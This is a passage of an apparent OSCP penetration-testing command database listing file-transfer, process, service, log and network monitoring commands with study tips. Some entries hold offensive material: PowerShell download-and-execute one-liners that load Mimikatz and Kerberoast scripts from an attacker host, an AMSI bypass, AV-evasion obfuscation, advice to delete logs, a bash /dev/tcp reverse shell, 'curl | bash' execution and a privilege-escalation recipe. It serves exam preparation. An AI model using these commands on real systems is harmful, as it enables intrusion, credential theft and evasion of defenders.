md5sum /opt/tools/exploit.sh /opt/tools/nc.exe /opt/tools/LinEnum.sh > original_hashes.txt
# Compare: diff hashes.txt original_hashes.txt (no output = perfect match)

SHA-256 (more secure, slower):
sha256sum <FILE>
# Use when MD5 collision attacks are concern (rare in OSCP)

Quick file size check (faster than hash):
ls -lh <FILE> (Linux)
dir <FILE> (Windows)
# Compare size with original - not foolproof but catches most corruption

Automate verification:
#!/bin/bash
# verify.sh - Compare file against known hash
FILE=$1
EXPECTED_HASH=$2
ACTUAL_HASH=$(md5sum ""$FILE"" | cut -d' ' -f1)
if [ ""$ACTUAL_HASH"" = ""$EXPECTED_HASH"" ]; then
    echo ""[+] $FILE: VERIFIED""
else
    echo ""[-] $FILE: CORRUPTED (expected $EXPECTED_HASH, got $ACTUAL_HASH)""
    exit 1
fi

USAGE:
./verify.sh LinEnum.sh 5d41402abc4b2a76b9719d911017c592

CORRUPTION TROUBLESHOOTING:

Binary file transferred in text mode:
# Symptoms: Hash mismatch, executable fails with ""cannot execute binary file""
# Solution: Use binary mode transfer
wget --content-disposition http://<LHOST>/nc.exe (HTTP auto-detects)
smbget -U '' smb://<LHOST>/share/nc.exe (SMB always binary)
ftp> binary; get nc.exe (FTP manual binary mode)

Line ending corruption (scripts):
# Symptoms: Hash mismatch on .sh/.py files, ""^M"" characters, ""bad interpreter""
# Solution: Convert line endings
dos2unix exploit.sh (Linux)
 sed -i 's/\r$//' exploit.sh (alternative)

Incomplete transfer:
# Symptoms: File size smaller than original, hash mismatch
# Solution: Check file size first
ls -lh <FILE> (should match original exactly)
# If smaller, re-download

Encoding corruption (copy/paste):
# Symptoms: Text files work but binaries fail
# Solution: NEVER copy/paste binary files - use proper transfer method

WHEN TO USE EACH HASH:
MD5: Fast, sufficient for OSCP transfer verification
SHA-1: Medium speed, more secure than MD5
SHA-256: Slower, most secure, use for critical payloads

TIME ESTIMATE:
MD5 calculation: <1 second for files <100MB
SHA-256: 2-3x slower than MD5
File size check only: <0.1 second (quick but less reliable)","high"
"ft-powershell-execute-memory","Execute PowerShell Script from Memory","file-transfer","IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1')","Download and execute PowerShell script directly in memory without touching disk. Bypasses file-based AV detection and leaves minimal forensic artifacts. OPSEC-friendly payload delivery.","in-memory-execution","STEALTHIEST PowerShell payload delivery. No disk writes = no file-based AV scan, no disk forensics. OSCP USE CASES: Invoke-Mimikatz, PowerUp, Invoke-Kerberoast, custom enumeration scripts. OPSEC ADVANTAGES: (1) No file I/O events, (2) No AV file scan trigger, (3) No forensic artifacts on disk, (4) Faster than download + execute. DISADVANTAGES: (1) PowerShell module/transcription logging still captures (if enabled), (2) Network traffic visible (HTTP GET logged), (3) Script stays in PowerShell process memory (detectable by memory scanners). Time estimate: 1-5 seconds (depends on script size and network speed).

MANUAL ALTERNATIVES:

Basic in-memory execution:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')

With ExecutionPolicy bypass:
powershell -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')""

With proxy credentials:
$wc = New-Object Net.WebClient
$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
IEX $wc.DownloadString('http://<LHOST>/script.ps1')

HTTPS (encrypted traffic):
IEX (New-Object Net.WebClient).DownloadString('https://<LHOST>/script.ps1')
# Requires Kali HTTPS server: python3 -m http.server 443 --ssl

SMB-based (no HTTP server needed):
IEX (Get-Content \\<LHOST>\share\script.ps1 -Raw)
# Kali SMB server: smbserver.py share /opt/scripts/ -smb2support

Execute with parameters:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'); Invoke-Mimikatz -DumpCreds

Encoded/obfuscated (bypass AV signatures):
$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://<LHOST>/encoded.txt')))
IEX $s

One-liner with shorter alias:
iex (iwr -Uri http://<LHOST>/script.ps1 -UseBasicParsing).Content
# iex = IEX, iwr = Invoke-WebRequest

Multiple scripts chained:
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerUp.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-AllChecks; Invoke-Mimikatz -DumpCreds

Download once, execute multiple times:
$script = (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')
IEX $script # First execution
IEX $script # Second execution (no re-download)

KALI HTTP SERVER SETUP:

Python HTTP server (simple):
cd /opt/powershell-scripts/
python3 -m http.server 80
# Access: http://<LHOST>/Invoke-Mimikatz.ps1

Apache (persistent):
sudo cp Invoke-Mimikatz.ps1 /var/www/html/
sudo systemctl start apache2
# Access: http://<LHOST>/Invoke-Mimikatz.ps1

HTTPS server (encrypted):
# Generate self-signed cert
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
python3 -m http.server 443 --ssl
# PowerShell ignores cert errors by default for DownloadString

COMMON POWERSHELL SCRIPTS FOR IN-MEMORY EXECUTION:

1. Invoke-Mimikatz (credential dumping):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

2. PowerUp (privilege escalation enumeration):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
Invoke-AllChecks

3. Invoke-Kerberoast (Kerberoasting):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | fl

4. Invoke-BloodHound (AD enumeration):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

5. PowerView (AD reconnaissance):
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')
Get-NetUser; Get-NetGroup

DETECTION EVASION:

Obfuscate URL:
$url = 'http://' + '10.10.14.5' + '/script.ps1'
IEX (New-Object Net.WebClient).DownloadString($url)

Obfuscate WebClient:
$wc = [Activator]::CreateInstance([Type]::GetTypeFromProgID('MSXML2.ServerXMLHTTP'))
$wc.open('GET', 'http://<LHOST>/script.ps1', $false)
$wc.send()
IEX $wc.responseText

Bypass AMSI (Antimalware Scan Interface):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')

OPSEC CONSIDERATIONS:
- Event ID 4688 (process creation) logs powershell.exe
- Event ID 3 (network connection) logs HTTP GET to Kali
- PowerShell module logging captures IEX command (if enabled)
- PowerShell transcription logs script content (if enabled)
- AMSI may scan downloaded string before execution
- Defenders monitor for: IEX, Net.WebClient, DownloadString in command line

MITIGATIONS:
- Use encoded Base64 commands to hide IEX from process arguments
- Use HTTPS to encrypt network traffic
- Obfuscate script content to evade AMSI
- Delete PowerShell logs post-exploitation (if possible)
- Use alternate protocols (SMB, DNS tunneling)

TIME ESTIMATE:
Script download: 1-5 seconds (depends on size and connection)
Script execution: Variable (depends on script)
Total: 2-10 seconds for typical scripts","high"
"ft-base64-encode","Base64: Encode for Transfer","file-transfer","base64 -w0 <FILE>","Encode file as base64 for copy/paste transfer or text-only channels","encoding","OSCP METHODOLOGY: Use when only text-based exfiltration available (web shells, SQL injection, command injection with output only). Encodes binary files as printable text. Size increases ~33%.

MANUAL ALTERNATIVE: Could use hex encoding (xxd), but base64 is more compact (hex is 2x size increase vs 1.33x).

USE CASES: 
- Copy/paste small files via RDP/VNC clipboard
- Exfiltrate via SQL injection (SELECT base64_data)
- Transfer via web shell echo output
- Bypass file type restrictions

EXAM TIP: Only practical for files <1MB due to terminal buffer limits and manual copy/paste. For larger files, use ft-nc-send or ft-curl-upload. After encoding, copy entire output (triple-click in terminal), paste to Kali, decode.

DECODE ON KALI: echo '<BASE64_STRING>' | base64 -d > decoded_file
DECODE ON WINDOWS: certutil -decode encoded.txt decoded.exe
DECODE IN POWERSHELL: [System.Convert]::FromBase64String('<STRING>') | Set-Content -Encoding Byte decoded.exe

TIME ESTIMATE: Encoding instant for files <10MB. Manual copy/paste adds 30-60 seconds.","medium"
"ft-scp-upload","SCP: Secure Upload","file-transfer","scp <FILE> <USERNAME>@<TARGET>:/tmp/","Upload file via SSH/SCP (requires credentials)","ssh-transfer","OSCP METHODOLOGY: Use when you have SSH credentials (password or key). Less common in OSCP than HTTP transfers, but useful when SSH is the primary access vector. Encrypted transfer, cleaner than setting up HTTP servers.

MANUAL ALTERNATIVE: Could use SFTP interactively, but SCP is faster for scripting single file transfers.

WHEN TO USE: 
- You have SSH credentials
- Target allows SSH (port 22/custom port open)
- Need encrypted transfer
- Transferring to/from pivot boxes where you have SSH

EXAM TIP: If you compromised SSH keys (/home/user/.ssh/id_rsa), use them: scp -i stolen_id_rsa file user@target:/tmp/. Remember -P (capital P) for non-standard ports.

VS HTTP: SCP is encrypted and authenticated, but requires SSH access. HTTP is unauthenticated and works over more restricted firewalls.

BIDIRECTIONAL: Use ft-scp-download for reverse transfer (target to Kali)

TIME ESTIMATE: Fast, limited by network speed. 1-10MB/sec typical.","medium"
"ft-scp-download","SCP: Secure Download","file-transfer","scp <USERNAME>@<TARGET>:<REMOTE_FILE> <LOCAL_PATH>","Download file from target via SSH/SCP (exfiltration with credentials)","ssh-transfer","OSCP METHODOLOGY: Use for exfiltration when you have SSH credentials. Cleaner than setting up upload servers. Encrypted transfer. Less common in OSCP than HTTP uploads, but valuable when SSH is access method.

MANUAL ALTERNATIVE: Could SSH in and cat file, redirect output, but SCP preserves binary files perfectly.

WILDCARDS: Download multiple files: scp user@host:'/var/log/*.log' ./logs/ (quotes required around remote path with wildcards)

EXAM TIP: If you compromised SSH keys, use them: scp -i stolen_key user@target:/root/proof.txt ./. For files you cannot read (permission denied), try to escalate privileges first or use sudo over SSH.

DIRECTORY DOWNLOAD: Download entire directories: scp -r user@target:/opt/sensitive_data ./loot/

VS HTTP UPLOAD: SCP is bidirectional (same tool for upload/download), encrypted, but requires SSH access. HTTP upload works through more restrictive firewalls.

TIME ESTIMATE: Fast, limited by network speed. 1-10MB/sec typical. Near-instant for proof.txt.","medium"
"ft-wget-download","Linux: wget Download","file-transfer","wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>","Download file using wget on Linux target (ubiquitous, reliable)","linux-download","OSCP METHODOLOGY: First choice for Linux downloads - installed on 99% of systems. Shows progress bar (helpful for large files), auto-retries on failure, supports resume.

MANUAL ALTERNATIVE: Could use browser if GUI access available, or manual HTTP GET via netcat, but wget is almost always available.

EXAM TIP: After download, check file integrity: md5sum <FILE> and compare with source. Make scripts executable: chmod +x <FILE>. If wget unavailable, immediately try curl.

COMMON DESTINATIONS: /tmp/ (world writable but cleared on reboot), /dev/shm/ (RAM disk, fast), /var/tmp/ (persistent), current directory if writable.

WGET VS CURL: wget is simpler for basic downloads, shows progress, handles recursive downloads better. curl has more features but complex syntax.

TIME ESTIMATE: Near-instant for scripts under 1MB, shows real-time progress for larger files.","high"
"ft-curl-download","Linux: curl Download","file-transfer","curl http://<LHOST>:<PORT>/<FILE> -o <OUTPUT>","Download file using curl on Linux target (alternative to wget)","linux-download","OSCP METHODOLOGY: Second choice for Linux downloads when wget unavailable. More verbose by default but powerful. Available on most modern Linux systems alongside wget.

MANUAL ALTERNATIVE: Could manually construct HTTP GET via netcat or telnet, but curl is almost always available.

CURL VS WGET: curl supports more protocols (HTTP, HTTPS, FTP, SCP, etc.) and has more advanced features, but syntax is more complex. Use curl if you need specific HTTP headers or authentication.

EXAM TIP: Remember lowercase -o for curl (uppercase -O uses remote filename). Add -s for silent mode in scripts. For piped execution: curl http://<IP>/script.sh | bash

IN-MEMORY EXECUTION: Download and execute without saving: curl http://<IP>/script.sh | bash (stealthier, no disk artifacts)

TIME ESTIMATE: Comparable to wget, instant for small files, shows progress for large downloads.","high"
"ft-bash-dev-tcp","Linux: Bash /dev/tcp Download","file-transfer","cat < /dev/tcp/<LHOST>/<PORT> > <OUTPUT>","Download file using bash pseudo-device (no external tools needed)","linux-download","OSCP METHODOLOGY: Last resort for downloads when wget, curl, nc all unavailable or blocked. Uses bash built-in TCP capabilities - no external commands executed, harder to detect in process monitoring.

MANUAL ALTERNATIVE: Could use telnet or other network tools, but /dev/tcp is pure bash.

WHEN TO USE: Extremely restricted environments where all download tools removed/blocked. Relies only on bash and cat (core utilities).

EXAM TIP: On attack machine, use netcat to serve file: nc -lvnp <PORT> < file. On target, immediately run this command. Connection is one-shot - closes after transfer. Check file integrity with md5sum.

LIMITATIONS: No error handling, no resume capability, requires bash (not sh/dash). Some bash builds lack /dev/tcp support (compile-time option).

REVERSE SHELLS: Same technique for shells: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

TIME ESTIMATE: Instant for small files, but no progress indication. File appears when complete.","medium"
"ft-python-http-server","Setup: Python HTTP Server","file-transfer","python3 -m http.server <PORT>","Start HTTP server on attack machine to serve files for download","server-setup","OSCP METHODOLOGY: This is your go-to file server for 95% of transfers. Run from directory containing your tools (cd ~/tools). Serves ALL files in current directory recursively - be careful not to expose sensitive data.

MANUAL ALTERNATIVE: You could manually configure Apache/Nginx, but that's overkill for OSCP. This one-liner is faster.

EXAM TIP: Start this immediately after getting VPN connection. Use a high port (8000-9000) to avoid permission issues. Keep the terminal visible to monitor download requests - confirms target connectivity.

TIME ESTIMATE: 5 seconds to start server, instant downloads for tools under 50MB.","high"
"ft-smb-server","Setup: Impacket SMB Server","file-transfer","impacket-smbserver <SHARE_NAME> <DIRECTORY> -smb2support","Start SMB server for Windows file transfers (faster than HTTP for large files)","server-setup","OSCP METHODOLOGY: Use for Windows targets when HTTP is blocked or for faster transfers (10-50x faster for large files). Port 445 often allowed on internal networks even when egress HTTP is blocked.

MANUAL ALTERNATIVE: Configure Samba manually in /etc/samba/smb.conf, but Impacket is much faster for quick transfers.

EXAM TIP: If target is Windows 10+ and connection fails, immediately try with authentication flags. After initial setup, files can be executed directly from share without downloading: \\<KALI_IP>\share\nc.exe

REALITY CHECK: Some modern Windows builds require SMB signing which this doesn't support - fall back to HTTP if authentication still fails.

TIME ESTIMATE: 5 seconds to start server. File transfers 10-100MB/sec on local network (much faster than HTTP).","high"
"ft-uploadserver","Setup: Python Upload Server","file-transfer","python3 -m uploadserver <PORT>","Start HTTP server that accepts file uploads from targets (exfiltration)","server-setup","OSCP METHODOLOGY: Essential for data exfiltration - getting loot OFF the target back to Kali. Accepts uploads at /upload endpoint via POST requests. Simpler than configuring PHP upload scripts.

MANUAL ALTERNATIVE: Write custom PHP/Python upload handler, but uploadserver is purpose-built and faster.

INSTALLATION: pip3 install uploadserver (may need to install once on exam Kali VM).

EXAM TIP: Start this when you need to exfiltrate proof.txt, database dumps, or any files from target. Files save to current directory by default - cd to organized folder first. Monitor terminal to see upload progress.

COMMON UPLOADS: proof.txt, local.txt, SAM/SYSTEM hives, password files, database dumps.

TIME ESTIMATE: 5 seconds to start server, upload speed depends on file size and network (typically 1-10MB/sec).","high"
"lsof-network-all","List All Network Connections","monitoring","lsof -i -P -n","List all network connections with process names, PIDs, and ports (no DNS resolution)","network-monitoring","CRITICAL for OSCP defense monitoring and privilege escalation.

Shows:
(1) What services are listening, (2) Which processes have active connections, (3) User running each service.

The -P and -n flags provide raw data without DNS/service lookups (faster and avoids network activity).

Time estimate:
2-5 seconds.

Manual alternative:
cat /proc/net/tcp; cat /proc/net/udp (manual parsing required).","high"
"lsof-listening-ports","List Only Listening Ports","monitoring","lsof -i -P -n -sTCP:LISTEN","Show only processes listening for incoming connections (attack surface identification)","network-monitoring","Filters to only show listening ports (attack surface).

OSCP tip:
Compare internal listening ports (127.0.0.1:*) vs external (0.0.0.0:* or specific IP).

Internal-only ports often have weaker authentication.

For UDP listeners:
lsof -i -P -n -sUDP:Idle.

Time estimate:
2 seconds.","high"
"lsof-port-specific","Find Process Using Specific Port","monitoring","lsof -i :<PORT>","Identify which process is using a specific port (both TCP and UDP)","network-monitoring","Essential for troubleshooting 'port already in use' errors or identifying what service is bound to a discovered port.

For TCP only:
lsof -i TCP:<PORT>.

For UDP only:
lsof -i UDP:<PORT>.

Time estimate:
<1 second.","high"
"fuser-port-tcp","Find Process Using Port (fuser)","monitoring","fuser -v <PORT>/tcp","Alternative method to identify process using a specific TCP port","network-monitoring","Lighter weight than lsof.

Good for quick port checks.

For UDP:
fuser -v <PORT>/udp.

Time estimate:
<1 second.","medium"
"netstat-listening-tcp","Netstat Listening Ports with PIDs","monitoring","netstat -tulpn","Show all listening TCP/UDP ports with process names and PIDs (classic tool, older systems)","network-monitoring","Classic tool but deprecated in favor of 'ss' on modern systems.

Still widely used in OSCP labs.

MUST run with sudo for PID information, otherwise shows '(No info)'.

OSCP tip:
Focus on:
(1) 0.0.0.0:* (externally accessible), (2) 127.0.0.1:* (local only, often weaker auth), (3) Unusual high ports (potential backdoors).

Time estimate:
2 seconds.","high"
"ss-listening-all","Socket Statistics (Listening Ports)","monitoring","ss -tulpn","Modern replacement for netstat - faster socket statistics with process mapping","network-monitoring","Modern replacement for netstat - 10x faster on systems with many connections.

Same syntax as netstat for easy transition.

OSCP tip:
Use with grep for specific ports:
ss -tulpn | grep :80.

For all connections (not just listening):
ss -tupn.

Time estimate:
<1 second.","high"
"ss-established-connections","Show Established Connections","monitoring","ss -tupn state established","Display only active established connections with process information","network-monitoring","Useful for detecting active attacks or data exfiltration.

OSCP defense tip:
Unexpected ESTABLISHED connections to external IPs may indicate compromise.

Time estimate:
<1 second.","medium"
"win-netstat-process-mapping","Windows Netstat with PIDs","monitoring","netstat -ano","Show all Windows network connections with PIDs for process mapping","network-monitoring","Essential for Windows network monitoring.

Combine with tasklist to map PIDs to names:
netstat -ano | findstr LISTENING, then tasklist /fi ""PID eq <PID>"".

OSCP tip:
Look for (1) LISTENING on 0.0.0.0 (externally accessible), (2) ESTABLISHED to unexpected IPs (C2 traffic), (3) Unusual ports (backdoors).

Time estimate:
2 seconds.","high"
"win-ps-netstat-process","PowerShell Network Connections","monitoring","Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess","PowerShell cmdlet for TCP connections with process IDs (modern Windows)","network-monitoring","Modern PowerShell alternative to netstat.

Easier to parse and filter.

For UDP:
Get-NetUDPEndpoint.

Time estimate:
3 seconds.

OSCP tip:
One-liner to show listening ports with names:
Get-NetTCPConnection -State Listen | Select LocalPort,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}}","high"
"win-tasklist-pid","Windows Get Process by PID","monitoring","tasklist /fi ""PID eq <PID>""","Look up Windows process name and details by PID (for netstat output)","network-monitoring","Quick way to map netstat PIDs to process names.

Common workflow:
netstat -ano | findstr :443 (get PID) → tasklist /fi ""PID eq 1234"" (get name).

Time estimate:
<1 second.","medium"
"win-wmic-process-pid","WMIC Get Process by PID","monitoring","wmic process where ProcessId=<PID> get ProcessId,Name,ExecutablePath,CommandLine","Get detailed Windows process information by PID including full path and command line","network-monitoring","More detailed than tasklist.

CommandLine often reveals sensitive data.

Time estimate:
1 second.","medium"
"systemctl-running-services","List Running systemd Services","monitoring","systemctl list-units --type=service --state=running","Show all currently active systemd services (modern Linux distributions)","service-enumeration","systemd is the init system for most modern Linux distributions (RHEL 7+, Ubuntu 16.04+, Debian 8+).

OSCP tip:
Focus on custom services (not part of base OS) - often have misconfigurations.

Time estimate:
2 seconds.

To see ALL services (including failed):
systemctl list-units --type=service --all","high"
"systemctl-enabled-services","List Enabled (Auto-Start) Services","monitoring","systemctl list-unit-files --type=service --state=enabled","Show services configured to start automatically at boot","service-enumeration","Enabled services persist across reboots - key for persistence/backdoor detection.

OSCP tip:
Custom services in /etc/systemd/system are often exploit targets.

Time estimate:
3 seconds.","medium"
"systemctl-service-permissions","Check systemd Service File Permissions","monitoring","ls -la /etc/systemd/system/*.service","List custom systemd service files with permissions (privilege escalation vector)","service-enumeration","CRITICAL for OSCP privilege escalation.

Writable service files = instant root if service runs as root.

Also check /lib/systemd/system/ (system services).

Time estimate:
2 seconds.

Exploit pattern:
(1) Find writable .service file, (2) Modify ExecStart=/path/to/reverse_shell, (3) sudo systemctl restart <SERVICE>.","high"
"service-status-all-sysv","SysV Init Services Status","monitoring","service --status-all","List all SysV init services with status (+ running, - stopped) - older Linux systems","service-enumeration","SysV init used on older Linux (pre-systemd).

Still found in OSCP labs.

[+] = running, [-] = stopped, [?] = status unknown.

Time estimate:
3 seconds.

Service scripts in /etc/init.d/ - check permissions for privesc.","medium"
"chkconfig-list-sysv","SysV Runlevel Configuration","monitoring","chkconfig --list","Show which SysV services are enabled at each runlevel (RHEL/CentOS)","service-enumeration","RHEL/CentOS specific.

Runlevels:
0=halt, 1=single-user, 3=multi-user, 5=graphical, 6=reboot.

Time estimate:
2 seconds.","low"
"win-sc-query-services","Windows List All Services","monitoring","sc query","List all Windows services with current state using Service Control command","service-enumeration","Service Control (sc.exe) is built-in Windows service management tool.

OSCP tip:
Focus on services with STATE=RUNNING and user-created services (non-Microsoft).

Time estimate:
5 seconds.","high"
"win-sc-query-all","Windows List All Services (Including Stopped)","monitoring","sc query state= all","Query all services including stopped ones (comprehensive service enumeration)","service-enumeration","Space after '=' is REQUIRED:
'state= all' not 'state=all'.

Shows stopped services which may have weak permissions or unquoted paths.

Time estimate:
10 seconds.","medium"
"win-sc-query-config","Windows Service Configuration Details","monitoring","sc qc <SERVICE_NAME>","Get detailed configuration for specific Windows service (binary path, start type, dependencies)","service-enumeration","CRITICAL for Windows privilege escalation.

Check for:
(1) Unquoted service paths with spaces, (2) Writable service binaries, (3) Services running as LocalSystem/SYSTEM.

Time estimate:
1 second.

Common privesc:
Unquoted path 'C:\Program Files\My Service\service.exe' → Place malicious 'C:\Program.exe'.","high"
"win-wmic-service-full","WMIC Service Enumeration","monitoring","wmic service list brief","List all Windows services with brief details using WMI","service-enumeration","WMIC deprecated in Windows 11+ but still in OSCP labs.

For specific properties:
wmic service get Name,PathName,StartMode,State.

Time estimate:
5 seconds.","high"
"win-wmic-service-path","WMIC Service Paths (Unquoted Path Check)","monitoring","wmic service get Name,PathName,StartMode,State","List Windows services with full binary paths to identify unquoted service path vulnerabilities","service-enumeration","CRITICAL Windows privesc technique.

Unquoted path 'C:\Program Files\My App\service.exe' allows placing 'C:\Program.exe' or 'C:\Program Files\My.exe'.

Time estimate:
5 seconds.

Filter for unquoted:
wmic service get Name,PathName | findstr /v /i ""C:\Windows"" | findstr /i /v '""'.","high"
"win-ps-get-service","PowerShell Get Services","monitoring","Get-Service | Where-Object {$_.Status -eq ""Running""}","PowerShell cmdlet to list running Windows services","service-enumeration","Modern PowerShell approach.

For all services:
Get-Service (no filter).

For stopped:
Where-Object {$_.Status -eq 'Stopped'}.

Time estimate:
3 seconds.","high"
"win-ps-get-service-details","PowerShell Service Details with Paths","monitoring","Get-WmiObject win32_service | Select-Object Name,State,PathName","PowerShell WMI query for service details including executable paths","service-enumeration","PowerShell WMI approach (modern).

Time estimate:
5 seconds.

One-liner for unquoted path detection:
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike '""*' -and $_.PathName -like '* *' -and $_.PathName -like 'C:\Program*'} | Select Name,PathName","high"
"proc-cmdline-all-processes","View All Process Command Lines","monitoring","cat /proc/*/cmdline | tr '\0' ' '","Display command line arguments for all running processes by reading /proc filesystem","process-monitoring","Each process has /proc/PID/cmdline containing its command line with null-byte separators.

Useful for detecting suspicious processes or hidden arguments.","high"
"ps-grep-pattern","Filter Processes by Pattern","monitoring","ps aux | grep <PATTERN>","Search running processes for specific pattern in command or arguments","process-monitoring","Piping ps output to grep is common but creates an extra grep process in results.

Use pgrep for cleaner output.","high"
"ps-grep-extract-pid","Extract PIDs by Process Name","monitoring","ps aux | grep <PROCESS_NAME> | awk '{print $2}'","Find process by name and extract only the PID using awk","process-monitoring","PID is always column 2 in 'ps aux' output.

More reliable alternatives:
pidof <name> or pgrep -f <pattern>","medium"
"proc-cmdline-specific-pid","View Specific Process Command Line","monitoring","cat /proc/<PID>/cmdline | tr '\0' ' '","Display command line arguments for a specific process by PID","process-monitoring","/proc/PID/cmdline shows exact command with all arguments.

Useful for revealing hidden flags or configurations.","high"
"crontab-user-direct-read","Read User Crontab File Directly","monitoring","cat /var/spool/cron/crontabs/<USERNAME>","Directly read user's crontab file from filesystem (requires root or specific permissions)","scheduled-tasks","Direct file access requires root.

Preferred method:
'crontab -u <user> -l'.

File location varies:
Debian/Ubuntu use /var/spool/cron/crontabs/, RedHat uses /var/spool/cron/","high"
"less-etc-crontab","View System-Wide Crontab with Less","monitoring","less /etc/crontab","Interactively view system-wide crontab file with pagination","scheduled-tasks","less allows scrolling and searching (use / to search).

System crontab includes run-parts entries for hourly/daily/weekly/monthly jobs.","high"
"find-all-cron-files","Find All Cron Configuration Files","monitoring","find /etc/cron* -type f","Locate all cron-related configuration files in /etc directory","scheduled-tasks","Finds files in:
/etc/cron.d/, /etc/cron.hourly/, /etc/cron.daily/, /etc/cron.weekly/, /etc/cron.monthly/, and /etc/crontab.

Essential for comprehensive scheduled task enumeration.","high"
"at-command-utility","AT Command-Line Scheduler","monitoring","at","Schedule one-time tasks using the AT utility (alternative to cron for non-recurring jobs)","scheduled-tasks","AT utility schedules one-time jobs.

View queued jobs:
'atq'.

View job details:
'at -c <job_id>'.

Jobs stored in /var/spool/at/.

Requires atd daemon running.","medium"
"ls-at-spool-directory","List AT Job Spool Directory","monitoring","ls -la /var/spool/at/","Enumerate scheduled AT jobs by listing spool directory","scheduled-tasks","Direct filesystem inspection of AT jobs.

Job files named with format 'a<timestamp><queue>'.

Better method:
use 'atq' command.

Requires appropriate permissions.","medium"
"tail-follow-syslog","Tail Syslog in Real-Time","monitoring","tail -f /var/log/syslog","Monitor syslog file in real-time as new entries are written","log-monitoring","Syslog path varies:
/var/log/syslog (Debian/Ubuntu), /var/log/messages (RedHat/CentOS).

On systemd systems, prefer journalctl.

Use Ctrl+C to exit.","high"
"journalctl-kernel-messages","View Kernel Messages via Journald","monitoring","journalctl -k","Display kernel messages from systemd journal (equivalent to dmesg on systemd systems)","log-monitoring","Requires systemd.

Shows same information as dmesg but with timestamps and systemd formatting.

Use -f to follow in real-time.","medium"
"journalctl-kernel-follow","Follow Kernel Messages in Real-Time","monitoring","journalctl -kf","Monitor kernel messages in real-time via journald","log-monitoring","Combines -k (kernel) and -f (follow).

Useful for monitoring hardware events, driver issues, or kernel-level security events in real-time.","medium"
"journalctl-ssh-failed-logins","Filter SSH Failed Login Attempts","monitoring","journalctl -u ssh | grep -i failed","Search SSH service logs for failed authentication attempts","log-monitoring","Service name may vary:
ssh, sshd, ssh.service.

On non-systemd systems, check /var/log/auth.log or /var/log/secure directly.","high"
"journalctl-sudo-commands","Search Sudo Command Execution Logs","monitoring","journalctl | grep 'sudo.*COMMAND'","Find all sudo command executions logged by journald","log-monitoring","Reveals privileged command history.

Pattern matches sudo logs containing 'COMMAND=' entries.

For focused output:
journalctl _COMM=sudo | grep COMMAND=","high"
"journalctl-failed-password","Search Failed Password Attempts","monitoring","journalctl | grep 'Failed password'","Find all failed password authentication attempts across all services","log-monitoring","Covers SSH, su, sudo, login, and other PAM-authenticated services.

Add -S (since) flag for time range:
journalctl -S today | grep 'Failed password'","high"
"ls-init-d","List SysVinit Services","monitoring","ls /etc/init.d/","Enumerate legacy SysVinit service scripts","service-monitoring","Shows SysVinit scripts on older systems or systemd systems with legacy services.

On systemd:
use 'systemctl list-unit-files'.

Service scripts are executable shell scripts.","medium"
"top-snapshot-memory-sorted","Top Memory Consumers Snapshot","monitoring","top -bn1 -o %MEM | head -20","Single snapshot of top 20 processes sorted by memory usage","resource-monitoring","Batch mode suitable for scripting.

Remove head to see all processes.

Alternative:
ps aux --sort=-%mem | head -20","medium"
"top-snapshot-cpu-sorted","Top CPU Consumers Snapshot","monitoring","top -bn1 -o %CPU | head -20","Single snapshot of top 20 processes sorted by CPU usage","resource-monitoring","Useful for identifying CPU-intensive processes.

CPU% shows usage since process start, not instantaneous.

For real-time:
use interactive top without -bn1.","medium"
"cat-proc-meminfo","View Detailed Memory Information","monitoring","cat /proc/meminfo","Display comprehensive memory statistics from kernel","resource-monitoring","Shows total, free, available, buffers, cached, swap, and more.

Key fields:
MemTotal, MemFree, MemAvailable (best indicator of free memory), SwapTotal, SwapFree.","low"
"top-snapshot-batch","Top Process Snapshot (Batch Mode)","monitoring","top -bn1","Single non-interactive snapshot of system processes and resource usage","resource-monitoring","Useful for scripting or capturing process state.

Shows CPU, memory, load average, and process list.

Default sort is by CPU usage.","medium"
"sar-cpu-monitoring","SAR CPU Utilization Monitoring","monitoring","sar -u 1 5","Collect CPU utilization statistics every 1 second for 5 iterations","resource-monitoring","Requires sysstat package.

Shows %user, %system, %iowait, %idle.

Useful for performance analysis and baseline establishment.

Historical data in /var/log/sa/.","low"
"cat-proc-loadavg","View System Load Average","monitoring","cat /proc/loadavg","Display 1, 5, and 15 minute load averages","resource-monitoring","Format:
load1 load5 load15 running/total last_pid.

Load represents average number of processes in run queue.

Values > CPU count indicate potential bottleneck.","low"
"ls-proc-fd-all","List All Process File Descriptors","monitoring","ls -l /proc/*/fd/","Enumerate all file descriptors for all processes (manual inspection required)","resource-monitoring","Shows open files, sockets, pipes for all processes.

Requires root for other users' processes.

Better alternative:
lsof.

Useful for identifying network connections or open files.","medium"
"lsof-directory-non-recursive","LSOF Directory Usage (Non-Recursive)","monitoring","lsof +d <DIRECTORY>","List processes using files in specific directory (non-recursive, faster than +D)","resource-monitoring","Faster than +D (recursive).

